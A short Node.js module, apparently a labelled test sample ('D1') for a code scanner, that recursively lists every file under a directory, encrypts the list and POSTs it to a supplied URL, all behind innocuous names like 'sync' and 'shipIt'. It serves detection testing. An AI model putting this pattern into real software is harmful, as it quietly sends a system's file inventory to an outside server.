'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D1 自定义 wrapper：外层自造名，但**内部仍调标准 API**
function sealEverything(buf) {
  const k = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', k, iv);
  return Buffer.concat([iv, c.update(buf), c.final()]);
}
async function shipIt(url, payload) {
  return fetch(url, { method: 'POST', body: payload });
}
async function sync(root, url) {
  return shipIt(url, sealEverything(Buffer.from(treescan(root).join('\n'))));
}
module.exports = { sync };
